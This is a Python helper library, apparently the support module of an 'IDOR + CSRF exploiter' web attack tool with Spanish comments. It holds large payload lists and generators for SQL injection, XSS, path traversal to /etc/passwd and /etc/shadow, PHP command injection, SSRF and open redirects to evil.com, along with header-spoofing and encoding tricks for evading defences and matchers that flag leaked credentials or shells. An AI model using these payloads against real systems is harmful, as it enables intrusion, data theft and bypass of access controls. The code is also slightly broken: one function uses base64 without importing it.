import random
import string
import re
import time
from itertools import product

# Colores para consola
RESET = "\033[0m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"

def banner():
    print(f"""{BOLD}{CYAN}
    ██████╗ ███████╗████████╗██╗  ██╗ █████╗ ██╗     
    ██╔══██╗██╔════╝╚══██╔══╝██║  ██║██╔══██╗██║     
    ██████╔╝█████╗     ██║   ███████║███████║██║     
    ██╔═══╝ ██╔══╝     ██║   ██╔══██║██╔══██║██║     
    ██║     ███████╗   ██║   ██║  ██║██║  ██║███████╗
    ╚═╝     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
         {YELLOW}IDOR + CSRF EXPLOITER – VERSIÓN DEFINITIVA{RESET}
    """)

def print_info(msg):
    print(f"{CYAN}[INFO]{RESET} {msg}")

def print_success(msg):
    print(f"{GREEN}[ÉXITO]{RESET} {msg}")

def print_warning(msg):
    print(f"{YELLOW}[ADVERTENCIA]{RESET} {msg}")

def print_error(msg):
    print(f"{RED}[ERROR]{RESET} {msg}")

def generar_id_aleatorio(longitud=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=longitud))

def es_url_valida(url):
    patron = re.compile(
        r'^(https?://)'                    # http:// o https://
        r'(([a-zA-Z0-9\-_]+\.)+[a-zA-Z]{2,})'  # dominio
        r'(:\d+)?'                         # puerto (opcional)
        r'(/[^\s]*)?$'                     # ruta (opcional)
    )
    return patron.match(url) is not None

def limpiar_url(url):
    return url.split('?')[0]

def dormir_random(segundos_min=1, segundos_max=3):
    t = random.uniform(segundos_min, segundos_max)
    time.sleep(t)

def generar_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
    ]
    return random.choice(user_agents)

def generar_cookie_aleatoria(longitud=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=longitud))

def registrar_log(mensaje, archivo="exploiter.log"):
    with open(archivo, "a", encoding="utf-8") as f:
        f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {mensaje}\n")

def limpiar_parametros_query(url):
    return url.split('?')[0]

def detectar_parametros_vulnerables(url):
    if '?' not in url:
        return []
    params = url.split('?', 1)[1].split('&')
    posibles = []
    patrones = ['id', 'user', 'token', 'session', 'admin', 'csrf', 'redirect', 'file', 'doc', 'ref']
    for p in params:
        for patron in patrones:
            if patron in p.lower():
                posibles.append(p)
    return posibles

def parametros_duplicados(url):
    """Devuelve True si hay parámetros duplicados en la URL."""
    if '?' not in url:
        return False
    params = [p.split('=')[0] for p in url.split('?', 1)[1].split('&')]
    return len(params) != len(set(params))

def mutar_parametros(url, payloads=None):
    """Genera variantes de la URL mutando los valores de los parámetros."""
    if '?' not in url:
        return [url]
    if payloads is None:
        payloads = ['../', '1', 'true', 'false', 'null', 'undefined', 'admin', '0', "' OR 1=1 --", "<script>alert(1)</script>"]
    base, query = url.split('?', 1)
    params = query.split('&')
    variantes = []
    for i, p in enumerate(params):
        key = p.split('=')[0]
        for payload in payloads:
            nueva = params.copy()
            nueva[i] = f"{key}={payload}"
            variantes.append(f"{base}?{'&'.join(nueva)}")
    return variantes

def extraer_parametros(url):
    """Devuelve un diccionario con los parámetros y sus valores."""
    if '?' not in url:
        return {}
    params = url.split('?', 1)[1].split('&')
    return dict(p.split('=', 1) if '=' in p else (p, '') for p in params)

def generar_combinaciones_parametros(url, valores):
    """
    Genera URLs con combinaciones de valores para cada parámetro.
    valores: dict con {param: [lista de valores]}
    """
    if '?' not in url:
        return [url]
    base, query = url.split('?', 1)
    params = [p.split('=')[0] for p in query.split('&')]
    listas = [valores.get(p, ['']) for p in params]
    combinaciones = []
    for combo in product(*listas):
        nueva = [f"{k}={v}" for k, v in zip(params, combo)]
        combinaciones.append(f"{base}?{'&'.join(nueva)}")
    return combinaciones

def detectar_parametros_formulario(html):
    """
    Extrae posibles parámetros sensibles de formularios HTML.
    """
    return re.findall(r'<input[^>]+name=["\']?([a-zA-Z0-9_\-]+)["\']?', html, re.I)

def normalizar_url(url):
    """
    Normaliza la URL quitando barras dobles y espacios.
    """
    url = re.sub(r'(?<!:)//+', '/', url)
    url = url.replace(':/', '://')
    return url.strip()

def generar_csrf_tokens_falsos():
    """
    Genera una lista de tokens CSRF falsos comunes.
    """
    return [
        '123456', 'abcdef', 'null', 'undefined', 'token', 'csrf', 'fake', 'test', generar_id_aleatorio(8)
    ]

def contiene_mensaje_error(respuesta):
    """
    Detecta si la respuesta contiene mensajes de error típicos.
    """
    errores = [
        'error', 'not allowed', 'forbidden', 'denied', 'invalid', 'failed', 'unauthorized', 'prohibido', 'rechazado'
    ]
    texto = respuesta.lower()
    return any(e in texto for e in errores)

def combinaciones_case_param(param):
    """
    Genera combinaciones de mayúsculas/minúsculas para un parámetro.
    """
    from itertools import product
    chars = [(c.lower(), c.upper()) if c.isalpha() else (c,) for c in param]
    return [''.join(p) for p in product(*chars)]

def diccionario_parametros_idor_csrf():
    """
    Devuelve un diccionario de parámetros y valores típicos para pruebas IDOR/CSRF.
    """
    return {
        'id': ['1', '2', '0', '999', '../', 'admin', 'guest'],
        'user': ['admin', 'test', 'guest', 'root'],
        'token': ['null', 'undefined', '123456', 'abcdef', generar_id_aleatorio(8)],
        'session': ['0', '1', 'deadbeef', generar_id_aleatorio(12)],
        'csrf': ['null', 'undefined', 'fake', 'csrf', generar_id_aleatorio(10)],
        'redirect': ['//evil.com', '/admin', 'http://evil.com'],
        'file': ['../../etc/passwd', 'C:\\boot.ini', '/etc/shadow'],
        'doc': ['1', '2', '999', '../'],
        'ref': ['../', 'evil', 'admin']
    }

def detectar_endpoints_sensibles(url):
    """
    Detecta si la URL contiene endpoints sensibles típicos.
    """
    patrones = [
        'admin', 'panel', 'dashboard', 'user', 'account', 'login', 'logout', 'register',
        'update', 'delete', 'remove', 'edit', 'change', 'reset', 'config', 'settings'
    ]
    return [p for p in patrones if p in url.lower()]

def variantes_ruta(url):
    """
    Genera variantes de la ruta para fuzzing de path traversal y bypasses.
    """
    if '://' not in url:
        return [url]
    base, path = url.split('://', 1)
    rutas = [
        path,
        path.replace('/', '//'),
        path.replace('/', '/./'),
        path.replace('/', '/../'),
        path.upper(),
        path.lower(),
        path.capitalize()
    ]
    return [f"{base}://{r}" for r in rutas]

def detectar_headers_sensibles(headers):
    """
    Detecta headers HTTP sensibles para manipulación.
    """
    sensibles = ['X-Forwarded-For', 'X-Real-IP', 'X-Original-URL', 'X-Custom-IP-Authorization', 'Referer', 'Origin', 'Cookie', 'Authorization']
    return [h for h in headers if h in sensibles]

def mutar_headers(headers, ip='127.0.0.1'):
    """
    Genera variantes de headers HTTP para bypass.
    """
    variantes = []
    for h in ['X-Forwarded-For', 'X-Real-IP', 'X-Client-IP', 'X-Remote-IP', 'X-Remote-Addr']:
        v = headers.copy()
        v[h] = ip
        variantes.append(v)
    return variantes

def fuzzing_masivo_param_headers(url, headers, valores_param=None):
    """
    Genera combinaciones masivas de parámetros y headers para fuzzing.
    """
    if valores_param is None:
        valores_param = diccionario_parametros_idor_csrf()
    urls = generar_combinaciones_parametros(url, valores_param)
    headers_var = mutar_headers(headers)
    combinaciones = []
    for u in urls:
        for h in headers_var:
            combinaciones.append((u, h))
    return combinaciones

def detectar_respuesta_exito(respuesta):
    """
    Detecta posibles respuestas de éxito (bypass).
    """
    patrones = [
        'success', 'done', 'ok', 'completado', 'autorizado', 'permitido', 'actualizado', 'deleted', 'removed', 'welcome'
    ]
    texto = respuesta.lower()
    return any(p in texto for p in patrones)

def variantes_param_encoding(param, valor):
    """
    Genera variantes de un parámetro con diferentes codificaciones.
    """
    import base64, urllib.parse
    variantes = [
        valor,
        urllib.parse.quote(valor),
        urllib.parse.quote_plus(valor),
        urllib.parse.quote(urllib.parse.quote(valor)),
        base64.b64encode(valor.encode()).decode()
    ]
    return [f"{param}={v}" for v in variantes]

def mutar_metodos_http():
    """
    Devuelve una lista de métodos HTTP para pruebas.
    """
    return ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']

def generar_diccionario_parametros_extremo():
    """
    Devuelve un diccionario EXTREMO de parámetros y valores para pruebas avanzadas IDOR/CSRF/LFI/SSRF.
    """
    return {
        'id': ['1', '2', '0', '999', '../', 'admin', 'guest', '-1', '2147483647', '0x01', '0', 'null', 'undefined', 'true', 'false'],
        'user': ['admin', 'test', 'guest', 'root', 'administrator', 'superuser', 'user', 'demo', 'sys', 'support'],
        'token': ['null', 'undefined', '123456', 'abcdef', generar_id_aleatorio(8), '0'*32, 'A'*32, 'deadbeef', '000000'],
        'session': ['0', '1', 'deadbeef', generar_id_aleatorio(12), 'null', 'undefined', 'session', 'admin'],
        'csrf': ['null', 'undefined', 'fake', 'csrf', generar_id_aleatorio(10), 'csrf_token', 'csrfmiddlewaretoken'],
        'redirect': ['//evil.com', '/admin', 'http://evil.com', 'javascript:alert(1)', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='],
        'file': ['../../etc/passwd', 'C:\\boot.ini', '/etc/shadow', '/proc/self/environ', 'php://filter/convert.base64-encode/resource=index.php'],
        'doc': ['1', '2', '999', '../', '.../', '....//', '////'],
        'ref': ['../', 'evil', 'admin', 'http://evil.com', 'javascript:alert(1)'],
        'path': ['../../../../../../etc/passwd', '/etc/passwd', 'C:\\Windows\\win.ini', 'C:\\boot.ini'],
        'url': ['http://localhost', 'http://127.0.0.1', 'http://0.0.0.0', 'http://evil.com', 'file:///etc/passwd'],
        'email': ['admin@evil.com', 'test@test.com', 'a@a.com', 'root@localhost'],
        'next': ['/admin', '/dashboard', 'http://evil.com'],
        'callback': ['http://evil.com', 'javascript:alert(1)'],
        'dest': ['http://evil.com', '/admin'],
        'continue': ['http://evil.com', '/admin'],
        'data': ['<script>alert(1)</script>', '{"admin":true}', 'null', 'undefined'],
        'json': ['{"admin":true}', '{"user":"admin"}', 'null'],
        'lang': ['en', 'es', 'fr', 'zh', 'ru', 'ar', 'ja', 'ko', 'de', 'it', 'pt', 'tr', 'admin'],
        'role': ['admin', 'user', 'guest', 'root', 'superuser'],
        'admin': ['1', 'true', 'yes', 'on', 'admin'],
        'is_admin': ['1', 'true', 'yes', 'on'],
        'access': ['admin', 'root', 'all', '1', 'true'],
        'debug': ['1', 'true', 'yes', 'on'],
        'test': ['1', 'true', 'yes', 'on'],
        'bypass': ['1', 'true', 'yes', 'on'],
        'submit': ['1', 'true', 'yes', 'on'],
        'action': ['delete', 'update', 'edit', 'remove', 'reset', 'change'],
        'method': ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT'],
    }

def variantes_parametros_todos_los_encodings(param, valor):
    """
    Genera variantes de un parámetro con todos los encodings posibles y combinaciones.
    """
    import base64, urllib.parse
    variantes = [
        valor,
        urllib.parse.quote(valor),
        urllib.parse.quote_plus(valor),
        urllib.parse.quote(urllib.parse.quote(valor)),
        base64.b64encode(valor.encode()).decode(),
        base64.b16encode(valor.encode()).decode(),
        base64.b32encode(valor.encode()).decode(),
        valor[::-1],  # reversed
        valor.upper(),
        valor.lower()
    ]
    return [f"{param}={v}" for v in variantes]

def variantes_parametros_super_agresivas(param, valor):
    """
    Genera variantes ultra agresivas de un parámetro con múltiples técnicas de evasión y payloads.
    """
    import base64, urllib.parse
    variantes = set()
    payloads = [
        valor, valor[::-1], valor.upper(), valor.lower(),
        f"{valor}/", f"/{valor}", f"{valor}..", f"..{valor}",
        f"{valor}%00", f"{valor}%0a", f"{valor}%0d", f"{valor}%09",
        f"{valor}#", f"{valor}//", f"{valor}/*", f"{valor}--", f"{valor}-- -",
        f"{valor} OR 1=1", f"{valor}' OR '1'='1", f"{valor}\" OR \"1\"=\"1",
        f"{valor}<script>alert(1)</script>", f"{valor}`cat /etc/passwd`",
        f"{valor}../../../../../../etc/passwd", f"{valor}<?php system('id');?>",
        f"{valor} UNION SELECT NULL", f"{valor} UNION SELECT ALL",
        f"{valor} AND 1=1", f"{valor}||1==1", f"{valor}admin", f"{valor}root"
    ]
    for p in payloads:
        variantes.add(p)
        variantes.add(urllib.parse.quote(p))
        variantes.add(urllib.parse.quote_plus(p))
        variantes.add(urllib.parse.quote(urllib.parse.quote(p)))
        variantes.add(base64.b64encode(p.encode()).decode())
        variantes.add(base64.b16encode(p.encode()).decode())
        variantes.add(base64.b32encode(p.encode()).decode())
    return [f"{param}={v}" for v in variantes if v]

def variantes_headers_hiper_agresivos(headers, ips=None, extras=None):
    """
    Genera variantes hiper agresivas de headers HTTP para bypass y evasión máxima.
    """
    if ips is None:
        ips = ['127.0.0.1', 'localhost', '0.0.0.0', '::1', '10.0.0.1', '192.168.1.1', '8.8.8.8', '1.1.1.1']
    if extras is None:
        extras = {
            'X-Original-URL': ['/admin', '/etc/passwd', '/'],
            'X-Rewrite-URL': ['/admin', '/etc/passwd', '/'],
            'X-Forwarded-Proto': ['https', 'http'],
            'X-Forwarded-Scheme': ['https', 'http'],
            'X-Forwarded-Port': ['443', '80', '22'],
            'X-HTTP-Method-Override': ['PUT', 'DELETE', 'PATCH'],
            'X-HTTP-Method': ['PUT', 'DELETE', 'PATCH'],
            'X-Method-Override': ['PUT', 'DELETE', 'PATCH'],
            'Referer': ['http://evil.com', 'https://admin', 'http://localhost'],
            'Origin': ['http://evil.com', 'null', 'file://'],
            'Authorization': ['Bearer ' + 'A'*40, 'Basic ' + base64.b64encode(b'admin:admin').decode()]
        }
    variantes = []
    for ip in ips:
        for h in [
            'X-Forwarded-For', 'X-Real-IP', 'X-Client-IP', 'X-Remote-IP', 'X-Remote-Addr',
            'X-Originating-IP', 'X-Forwarded-Host', 'X-Host', 'Forwarded'
        ]:
            v = headers.copy()
            v[h] = ip
            variantes.append(v)
    for h, vals in extras.items():
        for val in vals:
            v = headers.copy()
            v[h] = val
            variantes.append(v)
    return variantes

def variantes_metodos_http_totales():
    """
    Devuelve una lista TOTAL de métodos HTTP estándar y no estándar para máxima cobertura.
    """
    return [
        'GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT',
        'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK', 'UNLOCK', 'REPORT', 'MKACTIVITY', 'CHECKOUT', 'MERGE', 'SEARCH',
        'LINK', 'UNLINK', 'PURGE', 'VIEW', 'TRACK', 'DEBUG', 'NOTIFY', 'SUBSCRIBE', 'UNSUBSCRIBE', 'SOURCE'
    ]

def variantes_path_traversal_ultimas(path):
    """
    Genera variantes extremas y combinadas de path traversal y evasión.
    """
    variantes = [
        path, f"../{path}", f"..\\{path}", f"..%2f{path}", f"..%5c{path}", f"..%252f{path}", f"..%255c{path}",
        f"..%c0%af{path}", f"..%c1%1c{path}", f"..%e0%80%af{path}", f"..%u2215{path}", f"..%uEFC8{path}",
        f"..%2e%2e%2f{path}", f"..%2e%2e/{path}", f"..%2e%2e\\{path}", f"..%2e%2e%5c{path}", f"..%2e%2e%252f{path}",
        f"..%2e%2e%255c{path}", f"/..%00/{path}", f"/..%01/{path}", f"/..%ff/{path}", f"/....//{path}", f"/.../{path}",
        f"/%2e%2e/{path}", f"/%2e%2e%2f/{path}", f"/%252e%252e%252f/{path}", f"/%c0%ae%c0%ae/{path}",
        f"/%c1%1c%c1%1c/{path}", f"/%e0%80%ae%e0%80%ae/{path}"
    ]
    return variantes

def variantes_url_hiper_extremas(url):
    """
    Genera variantes hiper extremas de la URL para fuzzing avanzado y evasión máxima.
    """
    variantes = [url]
    if '://' in url:
        base, path = url.split('://', 1)
        variantes += [
            f"{base}://{path}//",
            f"{base}://{path}/./",
            f"{base}://{path}/../",
            f"{base}://{path.upper()}",
            f"{base}://{path.lower()}",
            f"{base}://{path.capitalize()}",
            f"{base}://{path}?{generar_id_aleatorio(8)}=1",
            f"{base}://{path}?debug=1",
            f"{base}://{path}?admin=1",
            f"{base}://{path}?bypass=1",
            f"{base}://{path}?test=1",
            f"{base}://{path}%00",
            f"{base}://{path}%2e%2e/",
            f"{base}://{path}%2e/",
            f"{base}://{path}%2e%2e%2f",
            f"{base}://{path}/%2e%2e/",
            f"{base}://{path}/%2e/",
            f"{base}://{path}/%2e%2e%2f",
            f"{base}://{path}?{generar_id_aleatorio(8)}=<script>alert(1)</script>",
            f"{base}://{path}?{generar_id_aleatorio(8)}=../../../../../../etc/passwd",
        ]
    return variantes

def detectar_respuesta_hiper_critica(respuesta):
    """
    Detecta respuestas hiper críticas y letales (indicadores de RCE, LFI, SSRF, takeover, etc).
    """
    patrones = [
        'root:', 'uid=', 'gid=', 'password', 'flag{', 'ctf{', 'token', 'api_key', 'access granted', 'admin', 'superuser',
        'hacked', 'owned', 'pwned', 'takeover', 'bypass', 'leaked', 'dump', 'database', 'sql', 'shell', 'command', 'executed',
        'root@', 'bash', 'sh-4.', 'bin/bash', 'uid=0', 'gid=0', 'www-data', 'system(', 'eval(', 'parse error', 'syntax error',
        'No such file or directory', 'Permission denied', 'Segmentation fault', 'Fatal error', 'Traceback (most recent call last)'
    ]
    texto = respuesta.lower()
    return any(p.lower() in texto for p in patrones)

